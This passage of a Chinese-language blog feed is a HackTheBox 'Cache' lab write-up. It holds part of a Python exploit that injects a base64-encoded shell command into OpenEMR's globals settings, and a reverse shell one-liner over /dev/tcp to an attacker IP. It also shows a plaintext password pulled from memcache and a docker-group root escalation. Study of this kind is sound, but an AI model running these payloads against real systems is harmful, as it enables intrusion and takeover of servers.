&quot;00=0&amp;form_202=&amp;form_203=&amp;form_204=365&amp;form_205=&amp;form_206=1&amp;form_208=&amp;form&quot;</span><br><span class="line">    payload += &quot;_210=&amp;form_211=&amp;form_212=&amp;form_213=&amp;form_214=&amp;form_215=&amp;form_216=SMTP&amp;for&quot;</span><br><span class="line">    payload += &quot;m_217=localhost&amp;form_218=25&amp;form_219=&amp;form_220=&amp;form_221=&amp;form_222=50&amp;for&quot;</span><br><span class="line">    payload += &quot;m_223=50&amp;form_224=&amp;form_225=&amp;form_226=&amp;form_227=50&amp;form_228=&amp;form_229=&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_230=&amp;form_231=1&amp;form_232=1&amp;form_233=1&amp;form_234=1&amp;form_235=1&amp;form_236=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_237=1&amp;form_238=1&amp;form_239=Model+Registry&amp;form_240=125789123&amp;form_24&quot;</span><br><span class="line">    payload += &quot;1=1&amp;form_242=1&amp;form_243=1&amp;form_244=&amp;form_245=&amp;form_246=1&amp;form_247=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;248=1&amp;form_249=5&amp;form_250=1&amp;form_252=1&amp;form_253=1&amp;form_254=1&amp;form_255=1&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_256=1&amp;form_257=1&amp;form_258=1&amp;form_262=&amp;form_263=6514&amp;form_264=&amp;form_26&quot;</span><br><span class="line">    payload += &quot;5=&amp;form_267=1&amp;form_268=0&amp;form_269=%2Fusr%2Fbin&amp;form_270=%2Fusr%2Fbin&amp;form&quot;</span><br><span class="line">    payload += &quot;_271=%2Ftmp&amp;form_272=%2Ftmp&amp;form_273=26&amp;form_274=state&amp;form_275=1&amp;form_27&quot;</span><br><span class="line">    payload += &quot;6=26&amp;form_277=country&amp;form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6&quot;</span><br><span class="line">    payload += &quot;+-o+page-left%3D72+-o+page-top%3D72&amp;form_279=&amp;form_280=&amp;form_282=2018-07-&quot;</span><br><span class="line">    payload += &quot;23&amp;form_283=1&amp;form_285=%2Fvar%2Fspool%2Fhylafax&amp;form_286=enscript+-M+Lett&quot;</span><br><span class="line">    payload += &quot;er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&amp;form_288=%2Fmnt%2Fscan_docs&amp;for&quot;</span><br><span class="line">    payload += &quot;m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&amp;form_292=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&amp;form_297=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;299=&amp;form_300=&amp;form_301=&amp;form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr&quot;</span><br><span class="line">    payload += &quot;ovider.php&amp;form_303=https%3A%2F%2Fssh.mydocsportal.com&amp;form_305=https%3A%&quot;</span><br><span class="line">    payload += &quot;2F%2Fyour_cms_site.com%2F&amp;form_306=&amp;form_307=&amp;form_308=0&amp;form_309=https%3&quot;</span><br><span class="line">    payload += &quot;A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&amp;form_312=https%3A%2F%2Fsecure.newcrop&quot;</span><br><span class="line">    payload += &quot;accounts.com%2FInterfaceV7%2FRxEntry.aspx&amp;form_313=https%3A%2F%2Fsecure.n&quot;</span><br><span class="line">    payload += &quot;ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_314=21600&amp;form_315=21600&amp;form_316=&amp;form_317=&amp;form_318=&amp;form_319=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_324=&amp;form_325=0&amp;form_327=137&amp;form_328=7C84773D5063B20BC9E41636A091C6F17E&quot;</span><br><span class="line">    payload += &quot;9C1E34&amp;form_329=C36275&amp;form_330=0&amp;form_332=https%3A%2F%2Fphimail.example.&quot;</span><br><span class="line">    payload += &quot;com%3A32541&amp;form_333=&amp;form_334=&amp;form_335=admin&amp;form_336=5&amp;form_339=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_346=LETTER&amp;form_347=30&amp;form_348=30&amp;form_349=72&amp;form_350=30&amp;form_351=P&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_352=en&amp;form_353=LETTER&amp;form_354=5&amp;form_355=5&amp;form_356=5&amp;form_357=8&amp;for&quot;</span><br><span class="line">    payload += &quot;m_358=D&amp;form_359=1&amp;form_360=9&amp;form_361=1&amp;form_362=104.775&amp;form_363=241.3&amp;&quot;</span><br><span class="line">    payload += &quot;form_364=14&amp;form_365=65&amp;form_366=220&quot;</span><br><span class="line"></span><br><span class="line">    p = &#123;&#125;</span><br><span class="line">    for c in payload.replace(&quot;&amp;&quot;, &quot;\n&quot;).splitlines():</span><br><span class="line">        a = c.split(&quot;=&quot;)</span><br><span class="line">        p.update(&#123;a[0]: a[1]&#125;)</span><br><span class="line">   </span><br><span class="line">    # Linux only, but can be easily modified for Windows.</span><br><span class="line">    _cmd = &quot;|| echo &quot; + base64.b64encode(args.cmd) + &quot;|base64 -d|bash&quot;</span><br><span class="line">    p.update(&#123;&quot;form_284&quot;: _cmd&#125;)</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Injecting payload&quot;)</span><br><span class="line">    s.post(args.host + &quot;/interface/super/edit_globals.php&quot;, data=p)</span><br><span class="line">    sp = s.get(args.host + &quot;/interface/main/daemon_frame.php&quot;) # M4tt D4em0n w0z h3r3 ;PpPpp</span><br><span class="line">    if sp.status_code == 200:</span><br><span class="line">        print(load + &quot;Payload executed&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x11-exploit"><a href="#0x11-exploit" class="headerlink" title="0x11.exploit"></a>0x11.exploit</h2><h3 id="1-首先需要安装环境argparse地址"><a href="#1-首先需要安装环境argparse地址" class="headerlink" title="1.首先需要安装环境argparse地址"></a>1.首先需要安装环境<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5weXRob25ob3N0ZWQub3JnL3BhY2thZ2VzLzE4L2RkL2U2MTdjZmMzZjYyMTBhZTE4MzM3NGNkOWY2YTI2YjIwNTE0YmJiNWE3OTJhZjk3OTQ5YzVhYWNkZGYwZi9hcmdwYXJzZS0xLjQuMC50YXIuZ3o=">argparse地址<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf argparse-1.4.0.tar.gz</span><br><span class="line">cd argparse-1.4.0</span><br><span class="line">python setup.py install</span><br><span class="line">easy_install argparse</span><br><span class="line">pip install argparse</span><br></pre></td></tr></table></figure><h3 id="2-kali监听"><a href="#2-kali监听" class="headerlink" title="2.kali监听"></a>2.kali监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ..</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# python2 exp.py http://hms.htb -u openemr_admin -p xxxxxx -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.17.216/6666 0&gt;&amp;1&#x27;</span><br><span class="line"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    </span><br><span class="line">/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   </span><br><span class="line">| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   </span><br><span class="line">| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    </span><br><span class="line">\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   </span><br><span class="line"> )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  </span><br><span class="line">(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) </span><br><span class="line">                                                       </span><br><span class="line">   =&#123;   P R O J E C T    I N S E C U R I T Y   &#125;=    </span><br><span class="line">                                                       </span><br><span class="line">         Twitter : @Insecurity                       </span><br><span class="line">         Site    : insecurity.sh                     </span><br><span class="line"></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Authenticating with openemr_admin:xxxxxx</span></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Injecting payload</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.188] 37914</span><br><span class="line">bash: cannot set terminal process group (1684): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="5-升级shell"><a href="#5-升级shell" class="headerlink" title="5.升级shell"></a>5.升级shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">&lt;ain$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;        </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="6-升级为交互shell"><a href="#6-升级为交互shell" class="headerlink" title="6.升级为交互shell"></a>6.升级为交互shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;e/main$ [1]+  已停止               nc -nvlp 6666        n$ </span><br><span class="line">[1]+: command not found</span><br><span class="line">&lt;ic_html/interface/main$ root@JIYE:~# stty raw -echo        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">&lt;lic_html/interface/main$ root@JIYE:~# nc -nvlp 6666        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;/var/www/hms.htb/public_html/interface/main$ whoami        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ www-data</span><br><span class="line">www-data: command not found</span><br><span class="line">&lt;@cache:/var/www/hms.htb/public_html/interface/main$        </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="7-切换到ash用户得到flag"><a href="#7-切换到ash用户得到flag" class="headerlink" title="7.切换到ash用户得到flag"></a>7.切换到ash用户得到flag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/home$ cd ash</span><br><span class="line">www-data@cache:/home/ash$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">www-data@cache:/home/ash$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@cache:/home/ash$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@cache:~$ whoami</span><br><span class="line">ash</span><br><span class="line">ash@cache:~$ pwd</span><br><span class="line">/home/ash</span><br><span class="line">ash@cache:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">ash@cache:~$ cat user.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">ash@cache:~$</span><br></pre></td></tr></table></figure><h2 id="0x12-提权"><a href="#0x12-提权" class="headerlink" title="0x12.提权"></a>0x12.提权</h2><h3 id="1-查看监听端口"><a href="#1-查看监听端口" class="headerlink" title="1.查看监听端口"></a>1.查看监听端口</h3><p><code>google发现11211端口为memcache服务</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ ss -lnt</span><br><span class="line">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    </span><br><span class="line">LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       </span><br><span class="line">LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*       </span><br><span class="line">LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       </span><br><span class="line">LISTEN   0         128                       *:80                     *:*       </span><br><span class="line">LISTEN   0         128                    [::]:22                  [::]:*       </span><br><span class="line">ash@cache:/$</span><br></pre></td></tr></table></figure><h3 id="2-memcache参考"><a href="#2-memcache参考" class="headerlink" title="2.memcache参考"></a>2.<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3BlbmV0cmF0aW9uLXRlc3Rpbmctb24tbWVtY2FjaGVkLXNlcnZlci8=">memcache参考<i class="fa fa-external-link-alt"></i></span></h3><blockquote><p>得到luffy用户与密码0n3_p1ec3</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">stats</span><br><span class="line">STAT pid 987</span><br><span class="line">STAT uptime 1807</span><br><span class="line">STAT time 1601548108</span><br><span class="line">STAT version 1.5.6 Ubuntu</span><br><span class="line">STAT libevent 2.1.8-stable</span><br><span class="line">STAT pointer_size 64</span><br><span class="line">STAT rusage_user 0.153965</span><br><span class="line">STAT rusage_system 0.193444</span><br><span class="line">STAT max_connections 1024</span><br><span class="line">STAT curr_connections 1</span><br><span class="line">STAT total_connections 32</span><br><span class="line">STAT rejected_connections 0</span><br><span class="line">STAT connection_structures 2</span><br><span class="line">STAT reserved_fds 20</span><br><span class="line">STAT cmd_get 0</span><br><span class="line">STAT cmd_set 150</span><br><span class="line">STAT cmd_flush 0</span><br><span class="line">STAT cmd_touch 0</span><br><span class="line">STAT get_hits 0</span><br><span class="line">STAT get_misses 0</span><br><span class="line">STAT get_expired 0</span><br><span class="line">STAT get_flushed 0</span><br><span class="line">STAT delete_misses 0</span><br><span class="line">STAT delete_hits 0</span><br><span class="line">STAT incr_misses 0</span><br><span class="line">STAT incr_hits 0</span><br><span class="line">STAT decr_misses 0</span><br><span class="line">STAT decr_hits 0</span><br><span class="line">STAT cas_misses 0</span><br><span class="line">STAT cas_hits 0</span><br><span class="line">STAT cas_badval 0</span><br><span class="line">STAT touch_hits 0</span><br><span class="line">STAT touch_misses 0</span><br><span class="line">STAT auth_cmds 0</span><br><span class="line">STAT auth_errors 0</span><br><span class="line">STAT bytes_read 4597</span><br><span class="line">STAT bytes_written 1200</span><br><span class="line">STAT limit_maxbytes 67108864</span><br><span class="line">STAT accepting_conns 1</span><br><span class="line">STAT listen_disabled_num 0</span><br><span class="line">STAT time_in_listen_disabled_us 0</span><br><span class="line">STAT threads 4</span><br><span class="line">STAT conn_yields 0</span><br><span class="line">STAT hash_power_level 16</span><br><span class="line">STAT hash_bytes 524288</span><br><span class="line">STAT hash_is_expanding 0</span><br><span class="line">STAT slab_reassign_rescues 0</span><br><span class="line">STAT slab_reassign_chunk_rescues 0</span><br><span class="line">STAT slab_reassign_evictions_nomem 0</span><br><span class="line">STAT slab_reassign_inline_reclaim 0</span><br><span class="line">STAT slab_reassign_busy_items 0</span><br><span class="line">STAT slab_reassign_busy_deletes 0</span><br><span class="line">STAT slab_reassign_running 0</span><br><span class="line">STAT slabs_moved 0</span><br><span class="line">STAT lru_crawler_running 0</span><br><span class="line">STAT lru_crawler_starts 2040</span><br><span class="line">STAT lru_maintainer_juggles 3984</span><br><span class="line">STAT malloc_fails 0</span><br><span class="line">STAT log_worker_dropped 0</span><br><span class="line">STAT log_worker_written 0</span><br><span class="line">STAT log_watcher_skipped 0</span><br><span class="line">STAT log_watcher_sent 0</span><br><span class="line">STAT bytes 371</span><br><span class="line">STAT curr_items 5</span><br><span class="line">STAT total_items 150</span><br><span class="line">STAT slab_global_page_pool 0</span><br><span class="line">STAT expired_unfetched 0</span><br><span class="line">STAT evicted_unfetched 0</span><br><span class="line">STAT evicted_active 0</span><br><span class="line">STAT evictions 0</span><br><span class="line">STAT reclaimed 0</span><br><span class="line">STAT crawler_reclaimed 0</span><br><span class="line">STAT crawler_items_checked 28</span><br><span class="line">STAT lrutail_reflocked 0</span><br><span class="line">STAT moves_to_cold 150</span><br><span class="line">STAT moves_to_warm 0</span><br><span class="line">STAT moves_within_lru 0</span><br><span class="line">STAT direct_reclaims 0</span><br><span class="line">STAT lru_bumps_dropped 0</span><br><span class="line">END</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line">get passwd       </span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-luffy登入"><a href="#3-luffy登入" class="headerlink" title="3.luffy登入"></a>3.luffy登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:/$ ssh luffy@127.0.0.1</span><br><span class="line">The authenticity of host &#x27;127.0.0.1 (127.0.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;127.0.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">luffy@127.0.0.1&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu Oct  1 10:34:55 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:              181</span><br><span class="line">  Usage of /:   75.0% of 8.06GB   Users logged in:        0</span><br><span class="line">  Memory usage: 12%               IP address for ens160:  10.10.10.188</span><br><span class="line">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">110 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed May  6 08:54:44 2020 from 10.10.14.3</span><br><span class="line">luffy@cache:~$ </span><br><span class="line">luffy@cache:~$ whoami</span><br><span class="line">luffy</span><br><span class="line">luffy@cache:~$uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br><span class="line">luffy@cache:~$</span><br></pre></td></tr></table></figure><h3 id="4-docker提权"><a href="#4-docker提权" class="headerlink" title="4.docker提权"></a>4.docker提权</h3><p><code>可以看到luffy属于docker用户组</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==">docker提权参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# </span><br><span class="line">root@386a1a19658b:/# cd</span><br><span class="line">root@386a1a19658b:~# pwd</span><br><span class="line">/root</span><br><span class="line">root@386a1a19658b:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@386a1a19658b:~# cat root.txt </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">root@386a1a19658b:~#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00.概述&quot;&gt;&lt;/a&gt;0x00.概述&lt;/h2&gt;&lt;img src=&quot;/2020/10/01/HTB-cache/image-20201001085152007.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CK-03</title>
    <link href="https://lunamoore.github.io/2020/09/26/CK-03/"/>
    <id>https://lunamoore.github.io/2020/09/26/CK-03/</id>
    <published>2020-09-26T02:11:41.000Z</published>
    <updated>2020-09-26T02:15:29.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00官网描述"><a href="#0x00官网描述" class="headerlink" title="0x00官网描述"></a>0x00官网描述</h2><blockquote><p>This box is upgraded edition of previous (MyFileServer 2) box.</p><p>Multiple way to get user and root flags are added.</p><p>Ping me on twitter @CyberKnight00 if you face any difficulty.</p><p>Don’t stop after finding 1 way there are more ways.</p><p>This works better with VirtualBox than VMware.</p></blockquote><a id="more"></a><h2 id="0x01-主机扫描"><a href="#0x01-主机扫描" class="headerlink" title="0x01.主机扫描"></a>0x01.主机扫描</h2><p><code>根据MAC地址得到目标主机为192.168.1.14</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sP 192.168.1.0/24 